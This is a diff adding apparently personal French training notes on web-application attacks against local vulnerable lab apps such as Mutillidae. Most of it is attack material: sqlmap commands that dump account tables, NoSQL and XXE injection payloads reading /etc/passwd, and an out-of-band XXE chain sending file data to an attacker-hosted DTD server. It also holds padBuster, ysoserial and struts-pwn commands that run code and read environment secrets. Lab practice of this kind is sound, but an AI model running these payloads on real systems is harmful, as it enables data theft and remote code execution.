@@ -1,0 +1,123 @@
+-SSL Server Test
+-SSl labs
+-shodan
+-https://www.informationisbeautiful.net/visualizations/worlds-biggest-data-breaches-hacks/
+-archive.org
+-ibm x-force exchange : pour verifier si l'ip n'ai pas dangereuse
+-https://www.sans.org : formation super cher en sécurité
+-https://www.tenable.com/products/nessus/nessus-professional : trouve toute les vulnerability
+-no limit sécu : podcast sécurité : https://www.nolimitsecu.fr/
+
+[ ->BurpSuite
+-Webgoat 52
+-Mutillidae
+-Perrugie
+-Wachopico
+]
+[
+-Webgoat 8.0
+-JuicyShop
+	[
+	-LXC -> SANS -> attaque crypto
+	]
+]
+
+A télécharger : foxyproxy
+
+sqlmap : 
+sqlmap --url="http://192.168.0.1/mutillidae/index.php?page=login.php" --data="username=test&password=test&login-php-submit-button=Login" --banner
+
+sqlmap --url="http://192.168.0.1/mutillidae/index.php?page=login.php" --data="username=test&password=test&login-php-submit-button=Login" -p username --dbms=MySQL --tables
+
+sqlmap --url="http://192.168.0.1/mutillidae/index.php?page=login.php" --data="username=test&password=test&login-php-submit-button=Login" -p username --dbms=MySQL -D mutillidae -T accounts --columns
+
+sqlmap --url="http://192.168.0.1/mutillidae/index.php?page=login.php" --data="username=test&password=test&login-php-submit-button=Login" -p username --dbms=MySQL -D mutillidae -T accounts --dump
+
+python ./sqlmap.py -r "D:\Repository\TrainingWeb\SECURITY - NOT FOR STUDENTS\sqlmap\mutillidae-login.php" -p username --dbms=MySQL -D mutillidae -T accounts --dump
+
+NoSQL payloads
+ '
+ "
+ {
+ } 
+ [$ne]
+ [$gt]
+ ||
+ ;
+ ||'1'='1
+ 
+ type[$ne]=user&username[$ne]=a&password=b'||'1'=='1
+ type=user&username[$ne]=a&password=b'||'1'=='1
+ 
+ 
+philippe.biton@thalesgroup.com
+
+<?xml version="1.0"?>
+<company>
+	<employee>
+		<firstname>Jo</firstname>
+		<lastname>Black</lastname>
+	</employee>
+	<employee>
+		<firstname>John</firstname>
+		<lastname>Doe</lastname>
+	</employee>
+	<employee>
+		<firstname>Bob</firstname>
+		<lastname>Smith</lastname>
+	</employee>
+</company>
+
+
+
+
+<?xml version="1.0"?>
+<!DOCTYPE parse [
+<!ENTITY file SYSTEM "/etc/passwd">
+]>
+<parse><text>&file;</text></parse>
+
+
+<?xml version="1.0"?>
+<!DOCTYPE parse [
+<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+]>
+<parse><text>&file;</text></parse>
+
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE roottag [
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=robots.txt">
+<!ENTITY % dtd SYSTEM "http://192.168.0.1:81/evil.dtd">
+%dtd;
+]>
+<company>
+	<employee>
+		<firstname>Jo</firstname>
+		<lastname>Black</lastname>
+	</employee>
+	<employee>
+		<firstname>John</firstname>
+		<lastname>Doe</lastname>
+	</employee>	
+	<employee>
+		<firstname>&send;Bob</firstname>
+		<lastname>Smith</lastname>
+	</employee>
+</company>
+
+<?xml version="1.0" encoding="utf-8"?>
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://192.168.0.1:81/?%file;'>">
+%all;
+
+capcha (casser l'encryption avec des xor etc) :
+./padBuster.pl http://192.168.0.1:8082/captcha.php?enc=5a565565365762535bee03526d6fb0fc 5a565565365762535bee03526d6fb0fc 8 -encoding 1
+
+java -Dhibernate5 -jar ysoserial-0.0.6-SNAPSHOT-all.jar Hibernate1 "touch /tmp/proxia42" | base64 -w0 > arezki.txt
+
+vulnérabilité sur un site strust :
+./struts-pwn.py -u 192.168.0.1:8082/showcase/fileupload --check
+./struts-pwn.py -u 192.168.0.1:8082/showcase/fileupload -c 'cat /etc/passwd'
+./struts-pwn.py -u 192.168.0.1:8082/showcase/fileupload -c 'cat /proc/self/environ'
+
+
